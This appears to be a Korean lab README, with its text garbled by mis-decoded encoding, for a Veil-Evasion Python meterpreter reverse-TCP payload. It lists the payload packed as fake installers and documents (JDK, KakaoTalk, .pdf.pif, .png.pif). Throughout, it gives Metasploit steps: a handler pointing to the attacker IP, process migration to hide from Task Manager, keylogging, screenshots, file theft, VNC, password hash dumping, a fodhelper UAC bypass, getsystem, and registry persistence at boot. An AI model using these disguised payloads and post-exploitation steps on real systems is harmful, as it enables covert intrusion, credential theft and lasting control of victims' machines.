## â—»ï¸ Payload ì •ë³´
1. ë„êµ¬ : Veil-Framework : Evasion
2. ì–¸ì–´ : Python
3. Payload íƒ€ì… : reverse_tcp
4. Payload ëª¨ë“ˆ : python/meterpreter/rev_tcp
5. LHOST : ~~192.168.94.137~~
6. LPORT : 4444
7. Handler : Payload_rev_tcp.rc
8. Packing file :
   - jdk-21_windows-x64_bin.exe
   - KakaoTalk_Setup.exe
   - ì˜¨ë¼ì¸) ì•ˆì „êµìœ¡ ì°¸ì—¬ ë° ì´ìˆ˜ì¦ ì¶œë ¥í•˜ëŠ”ë°©ë²•.pdf.pif
   - ì¡¸ì—…ì¸ì¦ì œ.png.pif

<br/>

## â—»ï¸ í™˜ê²½ êµ¬ì¶•
- Victim (win10) : Payload (jdk-21_windows-x64_bin.EXE) ë‹¤ìš´ë¡œë“œ
- Attacker (kali) : Handler (Payload_rev_tcp.rc) ë‹¤ìš´ë¡œë“œ
- Attacker IP : 192.168.94.137

<br/>

## â—»ï¸ ì‚¬ìš©ë²•
Kaliì—ì„œ Metasploitì„ ì‚¬ìš©í•´ handler ì‹¤í–‰

    msfconsole -r /handler ê²½ë¡œ/Payload_rev_tcp.rc

    # **ì£¼ì˜**
    # msf6 exploit(multi/handler) > í”„ë¡¬í”„íŠ¸ ìƒì„± ì‹œ ì‹¤í–‰ ì™„ë£Œ
    # handler ì‹¤í–‰ ì´í›„ victimì´ ë‹¤ìš´ ë°›ì€ payloadê°€ ì‹¤í–‰ë˜ì–´ì•¼ í•¨


### ğŸ“Œì£¼ìš” ëª…ë ¹ì–´
payloadê°€ ì‹¤í–‰ë˜ë©´ kaliì—ì„œ meterpreter ì„¸ì…˜ì´ ì˜¤í”ˆ

    [*] Sending stage (175686 bytes) to 192.168.94.xxx(victim ip)
    [*] Meterpreter session 1 opened (192.168.94.137:4444 -> 192.168.94.xxx:xxxxx)

1. ì„¸ì…˜ ì—°ê²°
   
        # ì„¸ì…˜ í™•ì¸
        sessions
        
        # í•´ë‹¹ id ì„¸ì…˜ ì—°ê²° => meterpreter > í”„ë¡¬í”„íŠ¸ë¡œ ë³€ê²½ë˜ë©´ ì„±ê³µ
        sessions -i <id>

2. í”„ë¡œì„¸ìŠ¤ ëª©ë¡ ìˆ¨ê¸°ê¸°

        # migrateë¥¼ ì‚¬ìš©í•´ ê¶Œí•œ ìƒìŠ¹ì„ ì‹œë„
        # explorer.exe ê¶Œí•œ íšë“ìœ¼ë¡œ ì‘ì—…ê´€ë¦¬ì í”„ë¡œì„¸ìŠ¤ ëª©ë¡ì—ì„œ ë³´ì´ì§€ ì•ŠìŒ
        
        migrate -N explorer.exe

3. ì‹œìŠ¤í…œ ì •ë³´ í™•ì¸
   
        sysinfo
        ipconfig
        getuid
        pwd

4. KeyScan

        keyscan_start
        keyscan_dump
        keyscan_stop

5. ê¸°íƒ€

        # ìŠ¤í¬ë¦°ìƒ· 
        screenshot
        
        # ê²€ìƒ‰
        search -f *.í™•ì¥ì
        
        # ë‹¤ìš´ë¡œë“œ & ì—…ë¡œë“œ
        download íŒŒì¼ì´ë¦„ kaliê²½ë¡œ
        upload /kaliê²½ë¡œ/íŒŒì¼ì´ë¦„ winê²½ë¡œ
        
        # ì‹œìŠ¤í…œ ì¢…ë£Œ
        reboot
        shutdown
       
        # ì›ê²© ë°ìŠ¤í¬í†± í™œì„±í™”
        run vnc
    
        # **ì‹œìŠ¤í…œ ê¶Œí•œ íšë“ í›„ ì‚¬ìš© ê°€ëŠ¥**
        # ì‹œìŠ¤í…œì„ ì‚¬ìš© ì¤‘ì¸ ê³„ì •ë“¤ì˜ ì‚¬ìš©ì ì¸ì¦(íŒ¨ìŠ¤ì›Œë“œ) í•´ì‹œ ê°’ ìˆ˜ì§‘
        run post/windows/gather/hashdump
   
### ğŸ“Œì§€ì†ì„± íšë“
í˜ì´ë¡œë“œì˜ ì§€ì†ì„±ì„ ìœ„í•´ ì‹œìŠ¤í…œ ê¶Œí•œì„ íšë“ í›„ ë ˆì§€ìŠ¤íŠ¸ë¦¬ì— ì§€ì†ì„± í‚¤ ë“±ë¡

#### ì‹œìŠ¤í…œ ê¶Œí•œ íšë“
getsystemì„ ì‚¬ìš©í•´ ì‹œìŠ¤í…œ ê¶Œí•œ ìƒìŠ¹ì„ ì‹œë„ ì˜¤ë¥˜ ë°œìƒ. UACê°€ enabled ë˜ì–´ìˆê¸° ë•Œë¬¸.

    meterpreter > getsystem
    [-] priv_elevate_getsystem: Operation failed: 1346 The following was attempted:
    [-] Named Pipe Impersonation (In Memory/Admin)
    [-] Named Pipe Impersonation (Dropper/Admin)
    [-] Token Duplication (In Memory/Admin)
    [-] Named Pipe Impersonation (RPCSS variant)
    [-] Named Pipe Impersonation (PrintSpooler variant)
    [-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)

    # UAC í™œì„±í™” ìƒíƒœ í™•ì¸
    run post/windows/gather/win_privs

1. UAC Bypass (using Fodhelper)

        # ì„¸ì…˜ ë°±ê·¸ë¼ìš´ë”©
        background
    
        # UAC ìš°íšŒ ëª¨ë“ˆ ì‚¬ìš© => msf6 exploit(windows/local/bypassuac_fodhelper) > í”„ë¡¬í”„íŠ¸ë¡œ ë³€ê²½ í™•ì¸
        use exploit/windows/local/bypassuac_fodhelper
    
        # optionsì—ì„œ SESSION, LHOST, LPORT í™•ì¸ ë° ì„¤ì •
        options
        set session <id>
        set LHOST 192.168.94.137
        set LPORT 4444
    
        # exploit ì‚¬ìš© ì „ 4444 PORTê°€ ì‚¬ìš©ë˜ê³  ìˆìœ¼ë©´ ì˜¤ë¥˜ê°€ ë°œìƒë˜ë¯€ë¡œ í™•ì¸ í›„ kill
        jobs
        kill <id>
    
        # exploit ì§„í–‰ => UACë¥¼ ìš°íšŒí•˜ì—¬ í”„ë¡œì„¸ìŠ¤ë¥¼ ê´€ë¦¬ì ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰ì‹œí‚¨ ì„¸ì…˜ ì˜¤í”ˆ
        exploit -j

2. Get System

        sessions -i <ìƒˆë¡œ ì˜¤í”ˆí•œ ì„¸ì…˜ì˜ id>
        getsystem
    
#### ë ˆì§€ìŠ¤íŠ¸ë¦¬ ë“±ë¡

    # background
    bg

    # ìœˆë„ìš° ë ˆì§€ìŠ¤íŠ¸ë¦¬ ë“±ë¡ ëª¨ë“ˆ ì‚¬ìš© => msf6 exploit(windows/local/registry_persistence) > í”„ë¡¬í”„íŠ¸ë¡œ ë³€ê²½ í™•ì¸
    use exploit/windows/local/registry_persistence

    # SESSION, STARTUP ì„¤ì •
    set session <ì‹œìŠ¤í…œ ê¶Œí•œ ì„¸ì…˜ id>
    set startup SYSTEM

    # ì‹œìŠ¤í…œ ë ˆë²¨ ë ˆì§€ìŠ¤íŠ¸ë¦¬ì— ì§€ì†ì„± í‚¤ ìƒì„±
    # ì‹œìŠ¤í…œ ë¶€íŒ… ì‹œ í˜ì´ë¡œë“œ ìë™ ì‹¤í–‰ 
    exploit -j

*ì°¸ê³ : ì‹œìŠ¤í…œ ê¶Œí•œ íšë“ í›„ ì‹œìŠ¤í…œ ì¢…ë£Œ ëª…ë ¹ì–´ ì˜¤ë¥˜ => migrate -N explorer.exeë¥¼ ì‚¬ìš©í•´ í”„ë¡œì„¸ìŠ¤ë¥¼ ì‚¬ìš©ì ì‹¤í–‰ìœ¼ë¡œ ë³€ê²½í•˜ì—¬ ì‚¬ìš©*
